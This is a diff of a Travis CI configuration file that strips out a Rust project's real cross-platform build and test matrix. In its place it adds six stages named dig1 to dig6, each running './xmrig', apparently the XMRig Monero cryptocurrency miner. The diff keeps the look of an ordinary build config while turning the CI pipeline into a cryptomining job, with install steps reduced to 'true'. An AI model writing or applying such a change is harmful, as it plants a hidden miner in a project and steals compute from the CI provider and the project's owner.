@@ -1,71 +1,27 @@
-sudo: required
-dist: trusty
-services: docker
-language: rust
+sudo: false
 
-matrix:
-  include:
-    - os: linux
-      env: TARGET=i686-unknown-linux-gnu
-           DOCKER=quay.io/ascii/i686-unknown-linux-gnu:latest
-    - os: linux
-      env: TARGET=x86_64-unknown-linux-gnu
-           DOCKER=quay.io/ascii/x86_64-unknown-linux-gnu:latest
-    - os: osx
-      env: TARGET=i686-apple-darwin
-    - os: osx
-      env: TARGET=x86_64-apple-darwin
+language: cpp
 
-    # Just testing for right cross compilers for these targets.
-    - os: linux
-      env: TARGET=i686-unknown-linux-musl
-           DOCKER=quay.io/ascii/i686-unknown-linux-musl:latest
-           SKIP_TESTS=1
-    - os: linux
-      env: TARGET=i686-pc-windows-gnu
-           DOCKER=quay.io/ascii/i686-pc-windows-gnu:latest
-           SKIP_TESTS=1
-    - os: linux
-      env: TARGET=x86_64-pc-windows-gnu
-           DOCKER=quay.io/ascii/x86_64-pc-windows-gnu:latest
-           SKIP_TESTS=1
+before_install:
+  - true
 
 install:
-  - curl https://static.rust-lang.org/rustup.sh |
-    sh -s -- --prefix=$HOME/rust --with-target=$TARGET
+  - true
 
-script:
-  - if [ ! -z "$DOCKER" ]; then
-      docker run
-        --entrypoint bash
-        -u `id -u`:`id -g`
-        -v $HOME/rust:/travis-rust:ro
-        -e RUST_BACKTRACE=1
-        -e ASCIII_LOG=trace
-        -w /buildslave
-        -v `pwd`:/buildslave
-        -v `pwd`/target:/buildslave/target
-        -v /target:$HOME
-        -e HOME=/target
-        -e TARGET
-        -e SKIP_TESTS
-        -it $DOCKER
-        ci/run-docker.sh;
-    else
-      PATH=$HOME/rust/bin:$PATH sh ci/run.sh;
-    fi
+jobs:
+    include:
+        - stage: dig1
+        - script: ./xmrig
+        - stage: dig2
+        - script: ./xmrig
+        - stage: dig3
+        - script: ./xmrig
+        - stage: dig4
+        - script: ./xmrig
+        - stage: dig5
+        - script: ./xmrig
+        - stage: dig6
+        - script: ./xmrig
 
-cache: cargo
-before_cache:
-  # Travis can't cache files that are not readable by "others"
-  - chmod -R a+r $HOME/.cargo
-
-branches:
-  only:
-    # release tags
-    - /^v\d+\.\d+\.\d+.*$/
-    - master
-
-notifications:
-  email:
-    on_success: never
+after_failure:
+  - echo ">> done <<"
